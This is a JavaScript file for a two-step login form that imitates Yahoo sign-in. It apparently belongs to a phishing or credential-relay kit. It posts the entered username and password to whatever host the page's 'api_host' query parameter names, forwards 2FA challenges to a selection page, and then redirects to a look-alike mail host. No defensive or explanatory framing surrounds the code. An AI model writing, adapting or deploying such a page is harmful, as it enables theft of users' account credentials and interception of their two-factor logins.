document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("login-form")
  const usernameField = document.getElementById("username")
  const passwordField = document.getElementById("password")
  const submitButton = form.querySelector(".submit-button")
  const errorMessage = document.getElementById("error-message")

  const urlParams = new URLSearchParams(window.location.search)
  const apiHost = urlParams.get("api_host")
  if (!apiHost) {
    showError("Configuration error: API host not specified.")
    return
  }
  const apiBaseUrl = `https://${apiHost}`

  let isPasswordNext = false

  form.addEventListener("submit", (e) => {
    e.preventDefault()
    submitButton.value = "Please wait..."
    submitButton.disabled = true

    if (!isPasswordNext) {
      // First step: send username
      const username = usernameField.value
      localStorage.setItem("yahoo_username", username)

      fetch(`${apiBaseUrl}/account/challenge/password`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ username: username }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.error) {
            showError(data.error_description || "Invalid username.")
            resetForm()
          } else {
            // Transition to password input
            usernameField.style.display = "none"
            passwordField.style.display = "block"
            passwordField.focus()
            submitButton.value = "Sign in"
            isPasswordNext = true
          }
        })
        .catch((error) => {
          showError("An unexpected error occurred. Please try again.")
          resetForm()
        })
        .finally(() => {
          submitButton.disabled = false
        })
    } else {
      // Second step: send password
      const username = localStorage.getItem("yahoo_username")
      const password = passwordField.value

      fetch(`${apiBaseUrl}/account/challenge/password`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ username: username, passwd: password }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.location) {
            // Check if it's a 2FA challenge
            if (data.location.includes("/account/challenge/challenge-selector")) {
              window.location.href = `2fa-selection.html?api_host=${apiHost}`
            } else {
              // Success, redirect to mail
              window.location.href = `https://${apiHost.replace("api.", "mail.")}/d/folders/1`
            }
          } else if (data.error) {
            showError(data.error_description || "Invalid password.")
            passwordField.value = ""
            passwordField.focus()
            submitButton.value = "Sign in"
            submitButton.disabled = false
          } else {
            showError("An unknown error occurred.")
            resetForm()
          }
        })
        .catch((error) => {
          showError("An unexpected network error occurred.")
          resetForm()
        })
    }
  })

  function showError(message) {
    errorMessage.textContent = message
    errorMessage.style.display = "block"
  }

  function resetForm() {
    usernameField.style.display = "block"
    passwordField.style.display = "none"
    passwordField.value = ""
    submitButton.value = "Next"
    submitButton.disabled = false
    isPasswordNext = false
  }
})
